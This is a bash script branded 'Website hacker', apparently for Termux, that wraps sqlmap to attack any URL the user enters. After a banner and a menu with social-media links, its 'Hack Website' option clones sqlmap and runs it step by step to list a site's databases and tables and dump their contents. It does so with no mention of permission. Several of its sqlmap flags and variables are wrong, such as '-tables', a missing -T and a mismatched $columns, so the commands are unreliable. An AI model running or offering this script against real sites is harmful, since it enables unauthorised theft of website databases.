#!/bin/bash
red='\033[1;31m'
blue='\033[1;34m'
white='\033[1;37m'
green='\033[1;32m'


printf "$green"

figlet -f big Website hacker 321....

printf "$red"
echo " ☠️ System Information ☠️ 


"



screenfetch

printf "$blue"

echo "++++++++Code By Varun Sharma++++++++++++++

"

echo " coded By varun Sharma 
----------------------------------------

 ( version 1.2 ) 
 " 
 
 
 
echo "=================================


"
 


echo "author : Varun Cyber Group 
----------------------------------------

"

echo "Instagram : varuncybergroup_467 
---------------------------------------

"

echo "Website : bsf-installerofficial.blogspot.com
---------------------------------------

"

printf "$blue"
echo "This Tool Is Based On sqlmap
---------------------------------------


" 
printf "$green"

#menu 

echo "[1] Hack Website 

" 

echo "[2] Follow Me On Instagram 


"

echo "[3] Our Website 

"

echo "4. About me 

" 

echo "root@webhacker~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
" 

read -p ">|" o
if [ $o = "1" ]
then
clear
printf "$red"

figlet -f big HACK WEBSITE 

echo " ++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++

" 

printf "$green"
git clone https://github.com/sqlmapproject/sqlmap
clear

figlet -f big Attacking On Website
cd sqlmap
echo "Enter Website Url = "
read -p ">|" Websiteurl
python2 sqlmap.py -u $Websiteurl --dbs

echo "+++++++++++++++++++++++++++++++++++++++++

"

echo " Enter DataBase Name To Explore = "
read -p ">|" Database
python2 sqlmap.py -u $Websiteurl -D $Database 

echo " Press Enter For Getting Tables = " 
read -p ">|" Tables
python2 sqlmap.py -u $Websiteurl -D $Database -tables

echo " Enter Tables Name For Explore =

"

read -p ">|" Tables
python2 sqlmap.py -u $Websiteurl -D $Database $Tables -columns

echo " Type What You Want From Columns = 
" 
read -p ">|" Columns
python2 sqlmap.py -u $Websiteurl -D $Database $Tables $columns --dump


elif [ $o = "2" ]
then
clear
termux-open-url https://www.instagram.com/varuncyberlions_467

elif [ $o = "3" ]
then
clear
termux-open-url https://bsf-installerofficial.blogspot.com/?m=1

elif [ $o = "4" ]
then
clear
printf "$green"
figlet -f big ABOUT ME

echo "No Information Found (!)
Anonymous " 
fi